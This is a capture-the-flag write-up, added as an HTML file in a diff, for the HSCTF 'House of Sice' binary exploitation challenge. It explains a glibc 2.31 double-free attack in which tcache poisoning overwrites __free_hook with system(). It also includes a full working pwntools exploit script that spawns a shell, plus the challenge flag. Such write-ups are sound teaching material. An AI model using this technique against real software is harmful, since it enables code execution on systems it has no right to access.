@@ -1,0 +1,162 @@
+<!--Solve date: 06/19/2021-->
+
+<h1>HSCTF - House of Sice</h1>
+
+<h2>Binary Exploitation - 481 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>This challenge demonstrates a heap vulnerability in that chunk pointers are not cleared from memory after they are freed. The program directly leaks <code>libc</code> at the beginning. Then, the user can either create or delete chunks of the smallest size, 0x20 (referred to as "purchasing" and "selling" "deets"). There are two types of deets - delightful and devious - where delightful deets are allocated by <code>malloc()</code> and devious deets are allocated by <code>calloc()</code>. After allocation, we can write 8 bytes in the form of a number (the "price" of the deet).</p>
+
+<img src = "./images/hsctf_houseofsice_1.png"/>
+
+<p class = "caption">Figure 1. Types of "deets". There is a third option ("flag"), but it's useless.</p>
+
+<p>Because pointers are not cleared from memory after use, and the program searches for a null pointer in the chunk list upon allocation, the user can only allocate a total of 16 chunks (whether or not they are eventually freed).</p>
+
+<p>The vulnerability is that chunks can be doubly freed, since there is no check on whether it has been freed before.</p>
+
+<img class = "small" src = "./images/hsctf_houseofsice_2.png"/>
+
+<p class = "caption">Figure 2. Pointers are not cleared after they are freed, and there is no check on whether a pointer has been freed already.</p>
+
+<h5>Double Free to Fastbin</h5>
+
+<p>The glibc version is 2.31, which disallows double freeing a chunk that is in the tcache. (This challenge would be trivial on earlier versions that don't perform the check on tcache.) However, double frees to fastbins are still not detected! So, we first allocate 10 chunks - 7 for the purpose of filling the tcache, 2 for the double free, and 1 to contain the data <code>/bin/sh\x00</code> which we will free once we have overwritten <code>__free_hook</code> with <code>system()</code>. Then, we free the first 7 (#0-#6), filling up the 0x20-tcache. After the tcache is full, additional chunks will be put into the 0x20-fastbin. Free #7, #8, <i>and then #7 again</i>, with the intent of returning #7 twice and poisoning the tcache. The heap now looks like the following:</p>
+
+<p><code>tcache[0x20] -> #6 -> #5 -> #4 -> #3 -> #2 -> #1 -> #0</code></p>
+
+<p><code>fastbin[0x20] -> #7 -> #8 -> #7 (-> #8 -> #7 -> ...)</code></p>
+
+<p>Note that in the process of freeing #7 twice to fastbin, we have actually turned the fastbin into an infinite loop, since #7 points to #8, which points to #7, ad infinitum.</p>
+
+<h5>Tcache Stashing From Fastbin and Tcache Poisoning</h5>
+
+<p>We purchase two delightful deets (which will give #6, then #5) to clear two spots on the tcache:</p>
+
+<p><code>tcache[0x20] -> #4 -> #3 -> #2 -> #1 -> #0</code></p>
+
+<p><code>fastbin[0x20] -> #7 -> #8 -> #7 (-> #8 -> #7 -> ...)</code></p>
+
+<p>Now, we purchase a devious deet. Unlike <code>malloc()</code>, <code>calloc()</code> directly uses <code>_int_malloc()</code> and thus never allocates from tcache. So, we will get #7 back from the fastbin. But even though <code>calloc()</code> does not allocate from tcache, <code>_int_malloc()</code> <i>will</i> attempt to fill the tcache from the corresponding fastbin after the allocated chunk is selected. So, #8 will be moved into tcache, followed by #7.</p>
+
+<p><code>tcache[0x20] -> #7 -> #8 -> #4 -> #3 -> #2 -> #1 -> #0</code></p>
+
+<p><code>fastbin[0x20] -> #8 -> #4[0x10]</code></p>
+
+<p>Note that the fastbin is now messed up when #8 is moved into tcache, because the forward pointer of #8 is set to the data region of #4. This "chunk" has size 0.</p>
+
+<p>If we set the price of this deet to the address of <code>__free_hook</code> (calculated from the libc leak), then the heap will look like the following:</p>
+
+<p><code>tcache[0x20] -> #7 -> __free_hook</code></p>
+
+<p><code>fastbin[0x20] -> #8 -> #4[0x10]</code></p>
+
+<p>Purchasing another delightful deet will return #7 again and put <code>__free_hook</code> at the head of the tcache.</p>
+
+<p><code>tcache[0x20] -> __free_hook</code></p>
+
+<p><code>fastbin[0x20] -> #8 -> #4[0x10]</code></p>
+
+<p>The next chunk to be returned lets us write to <code>__free_hook</code> and empties the tcache. At this point, freeing chunk #9 (which has <code>/bin/sh\x00</code> in its data section) spawns a shell.</p>
+
+<p>Interestingly, if we tried to allocate another deet, the program crashes because it tries to stash the chunk in the data section of #4 into tcache, but that chunk has an invalid size.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+from pwn import *
+
+ready = True
+debug = False
+
+if ready:
+    p = remote("house-of-sice.hsc.tf", 1337)
+    libc = ELF("./libc-2.31.so")
+    p.recvline()
+else:
+    p = process("./house_of_sice")
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    if debug:
+        context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+        gdb.attach(p, gdbscript = """
+        
+        """)
+
+
+# exploit
+def flush():
+    p.recvuntil(b"> ")
+
+def alloc(data):
+    flush()
+    p.sendline(b'1')
+    flush()
+    p.sendline(b'1')
+    flush()
+    p.sendline(str(data))
+    return
+
+# can only call this one time
+def calloc(data):
+    flush()
+    p.sendline(b'1')
+    flush()
+    p.sendline(b'2')
+    flush()
+    p.sendline(str(data))
+    return
+
+def free(idx):
+    flush()
+    p.sendline(b'2')
+    flush()
+    p.sendline(str(idx))
+    return
+
+
+# flush out intro messages
+for i in range(3):
+    p.recvline()
+
+libc.address = int(p.recvline().strip().split()[-1], 16) - libc.sym["system"]
+log.info("libc: %s" % (hex(libc.address)))
+
+# fill up tcache
+for i in range(7):
+    alloc(0)
+
+alloc(0)        #7: double free me!
+alloc(0)        #8: to prevent two consecutive frees
+alloc(u64(b"/bin/sh\x00"))      #9: free trap
+
+for i in range(7):
+    free(i)
+
+# tcache[0x20] -> [6] -> [5] -> [4] -> [3] -> [2] -> [1] -> [0]
+
+free(7)         #fastbin[0x20] -> [7]
+free(8)         #fastbin[0x20] -> [8] -> [7]
+free(7)         #fastbin[0x20] -> [7] -> [8] -> [7]
+
+alloc(0)        #10 = 6 || tcache[0x20] -> 5 -> 4 -> 3 -> 2 -> 1 -> 0 || fastbin[0x20] -> 7 -> 8 -> 7
+alloc(0)        #11 = 5 || tcache[0x20] -> 4 -> 3 -> 2 -> 1 -> 0 || fastbin[0x20] -> 7 -> 8 -> 7
+calloc(libc.sym["__free_hook"])         #12 = 7 || tcache[0x20] -> 7 -> free_hook
+alloc(0)        #13 = 7 || tcache[0x20] -> free_hook
+alloc(libc.sym["system"])               #14 = free_hook
+
+free(9)         #get shell
+
+#alloc(u64(b"/bin/sh\x00"))  ##doesn't work bc there's still junk still in fastbin
+#free(14)                    ##
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>flag{tfw_the_double_free_check_still_sucks}</code></p>
